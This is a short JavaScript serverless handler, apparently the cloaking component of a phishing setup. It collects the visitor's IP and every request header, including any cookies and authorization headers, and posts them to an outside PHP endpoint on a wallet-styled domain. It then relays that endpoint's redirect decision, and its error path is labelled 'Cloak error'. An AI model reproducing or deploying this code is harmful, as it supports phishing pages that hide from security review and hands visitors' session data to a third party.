export default async function handler(req, res) {
  const headers = { 'Content-Type': 'application/x-www-form-urlencoded' };

  // Получаем реальный IP из X-Forwarded-For
  const forwarded = req.headers['x-forwarded-for'];
  const clientIP = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress || '';

  const payload = new URLSearchParams();

  // Передаём IP как отдельный параметр
  payload.append('clientIP', clientIP);

  // Прокидываем все доступные заголовки
  for (const [key, value] of Object.entries(req.headers)) {
    if (typeof value === 'string') {
      payload.append(`headers[${key}]`, value);
    }
  }

  try {
    const response = await fetch('https://suitewebwallet.com/tldr99/scr.php', {
      method: 'POST',
      headers,
      body: payload.toString()
    });

    const json = await response.json();
    res.json(json);

  } catch (e) {
    console.error('Cloak error:', e);
    res.status(500).json({ redirect: false });
  }
}
